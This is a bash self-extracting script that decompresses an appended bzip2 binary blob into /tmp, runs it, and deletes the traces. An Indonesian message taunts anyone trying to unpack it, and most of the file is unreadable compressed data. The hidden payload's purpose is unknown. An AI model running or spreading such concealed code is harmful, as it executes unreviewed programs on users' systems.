#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�߬7  �߀ }������~����P��� 	(�zi����z$ޓML�5F#�~��G�A�z5O#C��4hb241	�LA��a �#OP4 �  4 �  �&MF���Ch�b4@�)M F��=2)�ɒz�h�L���O�3I�=#��wD9����A&Kl���!����+ǍOMq���ǣ�����c�ZBC�/��;� ���g�,`��T�e��R��T�Y��ϋ�  $����F�����ڂT�qbجn=�ע9o��mߖͱ������pg7dT�JJ�:�B �(�9�pހ&���)I�����4Ty�9dux�4���A=$�o�A0E��%pۙR���F���pˆ�q ���FhF�Nd�����Dj
.�2T�ܔ���&5���ې.Uc7Njۅ@�q�RQ���t쇗7�>{��r}E��lK�}�|�8�ӹ[V�Y�J�
<��҅�����+��}�SGhY�Ȯ���.�v�����6V��R��JCA�S$���4���N��5a��۽��U[���4ԛk�e#� �J�=X%��o0���u9C��z��.�����X���iu�b��o1�.����kk�O��T6�.�\|r΄�p�f!r�)M;��.�u���St���4��[6���u��A9��e�/���F��j��Yƥa6����(�{�	��_o�����G�;��:@��!yP�|��|.i�H3i¤5sWhl�J(�p%����K�hK�%\P<:r�0\�����|�2��Ț��S!���A)�(�i�R��i�ʥh���ާ�7��Z�D�HK�(? �����?��hg�h�7�;�Ð'��&�>A�(o�js^��#����ҜI��6��##H[4�]IJ_��:K �MVwc�Ӏ��jR�`����u.݉Hc����B�����k�BL�r[�Mb{���Bix0N��'�䘓�׀`!��ư۸������dl3n�%�.�p�!��Xn